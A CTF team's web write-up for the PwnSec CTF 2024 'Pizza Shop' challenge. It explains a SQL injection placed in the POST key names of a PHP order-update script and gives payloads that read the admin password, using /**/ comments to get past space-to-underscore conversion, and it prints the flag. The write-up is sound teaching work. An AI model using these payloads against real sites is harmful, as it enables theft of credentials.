<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="shortcut icon" href="/favicon.ico"><link rel="manifest" href="/site.webmanifest"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#212830"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><title>Pizza Shop | Writeups | Status 418</title><style>pre code.hljs{display:block;overflow-x:auto;padding:1em}code.hljs{padding:3px 5px}/*!
  Theme: GitHub Dark
  Description: Dark theme as seen on github.com
  Author: github.com
  Maintainer: @Hirse
  Updated: 2021-05-15

  Outdated base version: https://github.com/primer/github-syntax-dark
  Current colors taken from GitHub's CSS
*/.hljs{color:#c9d1d9;background:#0d1117}.hljs-doctag,.hljs-keyword,.hljs-meta .hljs-keyword,.hljs-template-tag,.hljs-template-variable,.hljs-type,.hljs-variable.language_{color:#ff7b72}.hljs-title,.hljs-title.class_,.hljs-title.class_.inherited__,.hljs-title.function_{color:#d2a8ff}.hljs-attr,.hljs-attribute,.hljs-literal,.hljs-meta,.hljs-number,.hljs-operator,.hljs-variable,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id{color:#79c0ff}.hljs-regexp,.hljs-string,.hljs-meta .hljs-string{color:#a5d6ff}.hljs-built_in,.hljs-symbol{color:#ffa657}.hljs-comment,.hljs-code,.hljs-formula{color:#8b949e}.hljs-name,.hljs-quote,.hljs-selector-tag,.hljs-selector-pseudo{color:#7ee787}.hljs-subst{color:#c9d1d9}.hljs-section{color:#1f6feb;font-weight:700}.hljs-bullet{color:#f2cc60}.hljs-emphasis{color:#c9d1d9;font-style:italic}.hljs-strong{color:#c9d1d9;font-weight:700}.hljs-addition{color:#aff5b4;background-color:#033a16}.hljs-deletion{color:#ffdcd7;background-color:#67060c}.content[data-astro-cid-tfjleern] a{color:#4985c1}.content[data-astro-cid-tfjleern] p,.content[data-astro-cid-tfjleern] h2{margin-bottom:24px}.content[data-astro-cid-tfjleern] h2 :not(:first-of-type){margin-top:48px}.content[data-astro-cid-tfjleern] img{max-width:100%;border-radius:8px}.content[data-astro-cid-tfjleern] code{background:#171c22;padding:.2em .5em;border-radius:6px;font-size:85%;margin:0;white-space:pre-wrap;word-wrap:break-word;word-break:break-word;overflow-wrap:anywhere}.content[data-astro-cid-tfjleern] pre{background:#171c22;border-radius:8px;margin:24px 0;display:block;padding:16px;white-space:pre-wrap;word-wrap:break-word;word-break:break-word;overflow-wrap:anywhere}.content[data-astro-cid-tfjleern] pre code{padding:0}
</style>
<link rel="stylesheet" href="/_astro/_page_.IxI8udFK.css">
<style>section[data-astro-cid-kggsjsm4]{display:block}[data-astro-cid-kggsjsm4][data-icon]{fill:#ffffffe6}[data-astro-cid-kggsjsm4][data-icon=github]{width:48px;height:48px;padding:8px}[data-astro-cid-kggsjsm4][data-icon=discord]{width:64px;height:64px}[data-astro-cid-kggsjsm4][data-icon=chevron]{width:16px;height:16px}[data-astro-cid-kggsjsm4][data-icon=archive]{width:36px;height:36px;padding:14px}a[data-astro-cid-kggsjsm4]{background:#171c22;justify-content:space-between;border-radius:8px;flex-direction:row;align-items:center;padding:16px;display:flex;color:inherit}a[data-astro-cid-kggsjsm4]:hover .right[data-astro-cid-kggsjsm4]{margin-right:16px}div[data-astro-cid-kggsjsm4]{flex-direction:row;align-items:center;display:flex;gap:16px}.right[data-astro-cid-kggsjsm4]{margin-right:24px;transition:.1s}
.wrapper[data-astro-cid-blwjyjpt]{border:2px solid var(--color);background:var(--background);display:inline-block;border-radius:16px;padding:0 8px;font-weight:500;color:var(--textColor);line-height:1.5rem;font-size:.75rem}
</style></head> <body> <section data-astro-cid-3ef6ksr2> <a class="logo" href="/" data-astro-cid-3ef6ksr2> <img src="/_astro/DalCTF_logo_cleanW.D7mbQLRA_ZwvbxW.webp" alt loading="eager" style="object-fit: contain;" data-astro-cid-3ef6ksr2="true" width="256" height="384" decoding="async"> </a> <div class="links" data-astro-cid-3ef6ksr2> <!-- <div class="dropdown">
      <a href="#" class="dropdown-toggle" role="button">Weekly Problems <span class="arrow">▼</span></a>
      <ul class="dropdown-menu">
        <li><a href="/weekly-problem">This Weeks</a></li>
        <li><a href="/past-weekly-problems">Past Problems</a></li>
      </ul>
    </div> --> <div class="dropdown" data-astro-cid-pqsyg2qg> <a href="#" class="dropdown-toggle" role="button" data-astro-cid-pqsyg2qg> Weekly Problems <span class="arrow" data-astro-cid-pqsyg2qg>▼</span> </a> <ul class="dropdown-menu" data-astro-cid-pqsyg2qg> <li data-astro-cid-pqsyg2qg><a href="/weekly-problem" data-astro-cid-pqsyg2qg>This Week&#39;s Problem(s)</a></li><li data-astro-cid-pqsyg2qg><a href="/past-weekly-problems" data-astro-cid-pqsyg2qg>Past Problems</a></li> </ul> </div>  <a href="/writeups" data-astro-cid-3ef6ksr2>Writeups</a><a href="/competitions" data-astro-cid-3ef6ksr2>Competitions</a> <a class="wrapper" href="https://discord.gg/4vEJJF6CQg" target="_blank" data-astro-cid-vnzlvqnm style="--textColor: #4985C1;--borderColor: #4985C1;--backgroundColor: transparent;"> Join us! </a>  </div> </section>    <section data-astro-cid-bbe6dxrz> <h3 data-astro-cid-bbe6dxrz>PwnSec CTF 2024</h3> <h1 data-astro-cid-bbe6dxrz>Pizza Shop</h1>  <div data-astro-cid-bbe6dxrz>  <div class="tags" data-astro-cid-tfjleern> <p class="wrapper" data-astro-cid-blwjyjpt style="--color: #0090FF;--textColor: #0090FF;--background: transparent;">Web</p> </div>  </div> </section>   <section data-astro-cid-kggsjsm4> <a href="https://github.com/DalCTF/PwnSec2024/tree/main/Web/PizzaShop" target="_blank" data-astro-cid-kggsjsm4> <div class="left" data-astro-cid-kggsjsm4> <svg width="1.03em" height="1em" data-astro-cid-kggsjsm4="true" data-icon="github">   <symbol id="ai:local:github" viewBox="0 0 98 96"><path fill="currentColor" fill-rule="evenodd" d="M48.854 0C21.839 0 0 22 0 49.217c0 21.756 13.993 40.172 33.405 46.69 2.427.49 3.316-1.059 3.316-2.362 0-1.141-.08-5.052-.08-9.127-13.59 2.934-16.42-5.867-16.42-5.867-2.184-5.704-5.42-7.17-5.42-7.17-4.448-3.015.324-3.015.324-3.015 4.934.326 7.523 5.052 7.523 5.052 4.367 7.496 11.404 5.378 14.235 4.074.404-3.178 1.699-5.378 3.074-6.6-10.839-1.141-22.243-5.378-22.243-24.283 0-5.378 1.94-9.778 5.014-13.2-.485-1.222-2.184-6.275.486-13.038 0 0 4.125-1.304 13.426 5.052a47 47 0 0 1 12.214-1.63c4.125 0 8.33.571 12.213 1.63 9.302-6.356 13.427-5.052 13.427-5.052 2.67 6.763.97 11.816.485 13.038 3.155 3.422 5.015 7.822 5.015 13.2 0 18.905-11.404 23.06-22.324 24.283 1.78 1.548 3.316 4.481 3.316 9.126 0 6.6-.08 11.897-.08 13.526 0 1.304.89 2.853 3.316 2.364 19.412-6.52 33.405-24.935 33.405-46.691C97.707 22 75.788 0 48.854 0" clip-rule="evenodd"/></symbol><use href="#ai:local:github"></use>  </svg> <p class="emphasis" data-astro-cid-kggsjsm4>View on GitHub</p> </div> <div class="right" data-astro-cid-kggsjsm4> <svg width="0.95em" height="1em" data-astro-cid-kggsjsm4="true" data-icon="chevron">   <symbol id="ai:local:chevron" viewBox="0 0 16 17"><g fill="none"><g clip-path="url(#a)"><path fill="currentColor" d="M13.057 8.48a.78.78 0 0 0-.251-.574L5.93 1.17a.8.8 0 0 0-.573-.226.777.777 0 0 0-.79.79.83.83 0 0 0 .225.565l6.32 6.18-6.32 6.18a.8.8 0 0 0-.225.565c0 .451.347.79.79.79a.78.78 0 0 0 .573-.234l6.875-6.728a.8.8 0 0 0 .251-.573z"/></g><defs><clipPath id="a"><path fill="currentColor" d="M0 .5h16v16H0z"/></clipPath></defs></g></symbol><use href="#ai:local:chevron"></use>  </svg> </div> </a> </section>  <span style="display: block; height: 64px"></span>  <section class="content" data-astro-cid-tfjleern> <div data-astro-cid-tfjleern><h2>Analysis</h2>
<p>The problem gives you the code for a pizza shop website written in PHP. Once started via Docker, the website is available on port 8000. We are presented with a login/register screen where we can create a local account. Once logged in, we are presented with a dashboard where we can place a new order, and a button that takes us to see previous orders. If any orders have been placed, we will have the option to edit them.</p>
<h2>Solution</h2>
<p>By analyzing the code, we will notice the presence of two <code>.php</code> files that manage the creation and updating of orders: <a href="https://github.com/DalCTF/PwnSec2024/blob/main/Web/PizzaShop/Source/src/place_order.php" target="_blank" rel="noopener noreferrer"><code>place_order.php</code></a> and <a href="https://github.com/DalCTF/PwnSec2024/blob/main/Web/PizzaShop/Source/src/update_order.php" target="_blank" rel="noopener noreferrer"><code>update_order.php</code></a>. In the first file we will see that the creation of an SQL query for inserting the new order. This is done using proper parameter bindings, so it does not seem vulnerable to SQL Injection. However, when we look at the code for updating an order, we will notice a particularly interesting snippet of the query building:</p>
<pre><code class="hljs language-php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
    <span class="hljs-variable">$new_order</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span>;
}

<span class="hljs-comment">// [...]</span>

<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$new_order</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) {
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$order</span>[<span class="hljs-variable">$key</span>] != <span class="hljs-variable">$new_order</span>[<span class="hljs-variable">$key</span>]) {
        <span class="hljs-variable">$sql</span> .= <span class="hljs-string">&quot;, <span class="hljs-subst">$key</span> = ?&quot;</span>;
        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$updated_data</span>, <span class="hljs-variable">$new_order</span>[<span class="hljs-variable">$key</span>]);
        <span class="hljs-variable">$updated_data_types</span> .=  <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$new_order</span>[<span class="hljs-variable">$key</span>]) == <span class="hljs-string">&#x27;double&#x27;</span> ? <span class="hljs-string">&#x27;d&#x27;</span>: <span class="hljs-string">&#x27;s&#x27;</span>; 
    }
}
</code></pre>
<p>In this snippet we can see that the code is taking all of the keys sent as part of the POST request and adding them to the <code>$new_order</code> object. Furthermore, for each key in this object, if the provided value does not match the value in the original order, some unsafe string concatenation is going to happen with the value of the key. In other words, while the intended behavior is to have a key, say, <code>instructions</code>, and to update the SQL template like <code>instructions = ?</code> so that a parameter value can be bound, nothing stops us from adding more content to the name of the key.</p>
<p>First, we need to place an order. We will do so by sending the following parameters as a request:</p>
<pre><code class="hljs language-python">{
    <span class="hljs-string">&quot;pizza_id&quot;</span>: <span class="hljs-string">&quot;1,2,3,4&quot;</span>,
    <span class="hljs-string">&quot;quantity&quot;</span>: <span class="hljs-string">&quot;1,0,0,0&quot;</span>,
    <span class="hljs-string">&quot;instructions&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
}
</code></pre>
<p>This is saying we will have a single pizza of the type that has ID = 1. This will give us an order ID. We can now update the same order, but this time we will be sending the following injection as a key:</p>
<pre><code class="hljs language-python">injection = <span class="hljs-string">&quot;instructions=SELECT password FROM users WHERE username = &#x27;admin&#x27;,order_id&quot;</span>

content = {
    <span class="hljs-string">&quot;pizza_id&quot;</span>: <span class="hljs-string">&quot;1,2,3,4&quot;</span>,
    <span class="hljs-string">&quot;quantity&quot;</span>: <span class="hljs-string">&quot;1,0,0,0&quot;</span>,
    <span class="hljs-string">&quot;instructions&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,
    injection: order_id,
}
</code></pre>
<p>If everything goes according to plan, the server will append the key <code>&quot;instructions=SELECT password FROM users WHERE username = 'admin',order_id&quot;</code> to the SQL query it builds, causing it to retrieve the admin user's password. We are including the <code>,order_id</code> portion to the end to make sure that the number of parameters matches what is getting bound by the server. To make sure we don't change too much, we are passing the original value for the <code>order_id</code> .</p>
<p>We would expect the executed query should be similar to:</p>
<pre><code class="hljs language-sql"><span class="hljs-keyword">UPDATE</span> orders <span class="hljs-keyword">SET</span> order_date <span class="hljs-operator">=</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>, instructions<span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span> password <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;admin&#x27;</span>),order_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">WHERE</span> order_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>
</code></pre>
<p>You will notice, however, that the executed query is more like this (notice the <code>_</code> characters):</p>
<pre><code class="hljs language-sql"><span class="hljs-keyword">UPDATE</span> orders <span class="hljs-keyword">SET</span> order_date <span class="hljs-operator">=</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>, instructions<span class="hljs-operator">=</span>(SELECT_password_FROM_users_WHERE_username_<span class="hljs-operator">=</span>_<span class="hljs-string">&#x27;admin&#x27;</span>),order_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">WHERE</span> order_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>
</code></pre>
<p>This happens because the PHP server will replace our spaces with <code>_</code> to avoid confusion between keys and values (as in, to stop exactly what we are trying to do). Not only does this change the value of key, it makes the query fail as well. We need to replace the spaces with another character that indicates to SQL that we want to separate the words - also known as 'to cause tokenization' - while not being modified by PHP. We can achieve that by sending <code>/**/</code>. This gets treated as a comment by SQL which, despite being empty, causes tokenization.</p>
<p>Therefore, our injection should be:</p>
<pre><code class="hljs language-sql"><span class="hljs-keyword">UPDATE</span> orders <span class="hljs-keyword">SET</span> order_date <span class="hljs-operator">=</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>, instructions<span class="hljs-operator">=</span>(<span class="hljs-keyword">SELECT</span><span class="hljs-comment">/**/</span>password<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span>users<span class="hljs-comment">/**/</span><span class="hljs-keyword">WHERE</span><span class="hljs-comment">/**/</span>username<span class="hljs-comment">/**/</span><span class="hljs-operator">=</span><span class="hljs-comment">/**/</span><span class="hljs-string">&#x27;admin&#x27;</span>),order_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">WHERE</span> order_id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>
</code></pre>
<p>Now the query should execute successfully. Note that the <code>instructions</code> value will NOT change on the current page. You will need to navigate to the <code>view_orders.php</code> page to see the updated value. (I, embarassingly, spent way too much time trying to figure out what was wrong with my injection while the only problem was that I was not seeing the updated value).</p>
<p>The value of the instructions on the order will be the admin user's password. You can now login as admin using that password and you will be greeted with the flag:</p>
<p><code>PWNSEC{I_D0NT_L1K3_SP4C3S_1N_SQL}</code></p>
</div> </section>  <section data-astro-cid-sz7xmlte> <p data-astro-cid-sz7xmlte>
Last Updated in 2025<br data-astro-cid-sz7xmlte>
Halifax, NS<br data-astro-cid-sz7xmlte>
Canada
</p> </section>  </body></html> 